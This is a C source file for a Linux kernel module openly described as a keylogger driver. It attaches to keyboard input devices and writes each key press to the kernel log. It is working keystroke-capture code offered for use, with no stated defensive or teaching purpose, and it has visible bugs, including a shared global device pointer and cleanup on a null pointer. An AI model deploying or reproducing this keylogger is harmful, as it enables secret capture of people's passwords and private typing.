/*
 * kbdlogger driver
 *
 * Copyright (C) 2014 Rafael do Nascimento Pereira <rnp@25ghz.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * Keylogger driver - capture keypress events
 *
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/init.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/kobject.h>
#include <linux/time.h>
#include <linux/pci.h>
#include <linux/platform_device.h>
#include <linux/uaccess.h>
#include <linux/major.h>

MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Input driver keyboard logger");

#define NUMDEVS  1
#define DEVNAME  "kbdlogger"

#define EVDEV_MINOR_BASE	64
#define EVDEV_MINORS		32
#define EVDEV_MIN_BUFFER_SIZE	64U
#define EVDEV_BUF_PACKETS	8

const char *kbdstr = "keyboard";

struct kbdloggerdev {
	struct input_handle handle;
	struct device dev;
	struct cdev   cdev;
};

struct kbdloggerdev *kldev;

static const struct file_operations kldev_fops = {
	.owner    = THIS_MODULE,
};


static void kldev_release(struct device *dev)
{
}

static void kbdlogger_cleanup(void)
{
	cdev_del(&kldev->cdev);
	device_del(&kldev->dev);
	input_close_device(&kldev->handle);
	input_free_minor(MINOR(kldev->dev.devt));
	input_unregister_handle(&kldev->handle);
	put_device(&kldev->dev);
	kfree(kldev);
}

static int kbdlogger_connect(struct input_handler *handler,
		struct input_dev *dev, const struct input_device_id *id)
{
	int error;
	int minor;
	int dev_no;

	/* if the device is not a keyboard it is filtered out. */
	if (!strstr(dev->name, kbdstr))
		return 0;

	minor = input_get_new_minor(EVDEV_MINOR_BASE, EVDEV_MINORS, true);
	if (minor < 0) {
		error = minor;
		pr_err("failed to reserve new minor: %d\n", error);
		return error;
	}

	kldev = kzalloc(sizeof(struct kbdloggerdev), GFP_KERNEL);
	if (!kldev) {
		error = -ENOMEM;
		goto err_free_minor;
	}

	dev_no = minor;
	/* Normalize device number if it falls into legacy range */
	if (dev_no < EVDEV_MINOR_BASE + EVDEV_MINORS)
		dev_no -= EVDEV_MINOR_BASE;
	dev_set_name(&kldev->dev, "event%d", dev_no);

	kldev->handle.dev = dev;
	kldev->handle.handler = handler;
	kldev->handle.name = "kbdlogger_handle";
	kldev->handle.private = kldev;

	kldev->dev.devt = MKDEV(INPUT_MAJOR, minor);
	kldev->dev.class = &input_class;
	kldev->dev.parent = &dev->dev;
	kldev->dev.release = kldev_release;
	device_initialize(&kldev->dev);

	error = input_register_handle(&kldev->handle);
	if (error)
		goto err_cleanup_kldev;

	/* char device setup (struct cdev) */
	cdev_init(&kldev->cdev, &kldev_fops);
	kldev->cdev.kobj.parent = &kldev->dev.kobj;
	error = cdev_add(&kldev->cdev, kldev->dev.devt, 1);
	if (error)
		goto err_cleanup_kldev;


	/* device registering */
	error = device_add(&kldev->dev);
	if (error)
		goto err_cleanup_kldev;

	error = input_open_device(&kldev->handle);
	if (error)
		goto err_cleanup_kldev;

	pr_info("Connected device: %s (%s at %s)\n",
		dev_name(&dev->dev),
		dev->name ?: "unknown",
		dev->phys ?: "unknown");

	return 0;

err_free_minor:
	input_free_minor(minor);
	return error;
err_cleanup_kldev:
	kbdlogger_cleanup();
	return error;
}

static void kbdlogger_event(struct input_handle *handle, unsigned int type,
			unsigned int code, int value)
{
	if (type == EV_KEY) {
		pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
		dev_name(&handle->dev->dev), type, code, value);
	}
}

static void kbdlogger_disconnect(struct input_handle *handle)
{
	pr_info("Disconnected device: %s\n",
		dev_name(&handle->dev->dev));
	kbdlogger_cleanup();
}

static const struct input_device_id kbdlogger_ids[] = {
	{.driver_info = 1 },  /* driver_info = 1 ??  */
	{},
};

MODULE_DEVICE_TABLE(input, kbdlogger_ids);

static struct input_handler kbdlogger_handler = {
	.connect    = kbdlogger_connect,
	.disconnect = kbdlogger_disconnect,
	.event      = kbdlogger_event,
	.id_table   = kbdlogger_ids,
	.name       = "kbdlogger_handler",
};


static int __init kbdlogger_init(void)
{
	int err;

	if (input_register_handler(&kbdlogger_handler)) {
		pr_err("Failed input handler register\n");
		err = -ENOMEM;
		goto fail;
	}

	pr_info("loaded\n");
	return 0;
fail:
	kbdlogger_cleanup();
	return err;
}


static void __exit kbdlogger_exit(void)
{
	input_unregister_handler(&kbdlogger_handler);
	pr_info("exited\n");
}

module_init(kbdlogger_init);
module_exit(kbdlogger_exit);
